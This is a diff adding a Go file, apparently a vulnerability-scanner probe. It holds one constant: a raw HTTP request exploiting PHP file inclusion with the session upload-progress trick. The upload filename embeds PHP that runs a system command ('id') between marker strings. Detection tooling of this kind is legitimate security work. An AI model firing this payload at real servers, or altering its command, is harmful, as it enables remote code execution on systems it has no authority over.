@@ -1,0 +1,3 @@
+package probe
+
+const request = "POST /vuln.php?page=/var/lib/php/session/sess_p2sopchain000000000000 HTTP/1.1\r\nHost: target.invalid\r\nCookie: PHPSESSID=p2sopchain000000000000\r\nContent-Type: multipart/form-data; boundary=reconstructed-upload-boundary\r\nContent-Length: 363\r\nConnection: close\r\n\r\n--reconstructed-upload-boundary\r\nContent-Disposition: form-data; NaMe=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nx\r\n--reconstructed-upload-boundary\r\nContent-Disposition: form-data; NaMe=\"f\"; filename=\"<?php echo 'RCE_noyzzg0YVLBU'; system(base64_decode('aWQ=')); echo 'RCE_noyzzg0YVLBU'; ?>\"\r\nContent-Type: application/octet-stream\r\n\r\nA\r\n--reconstructed-upload-boundary--\r\n"
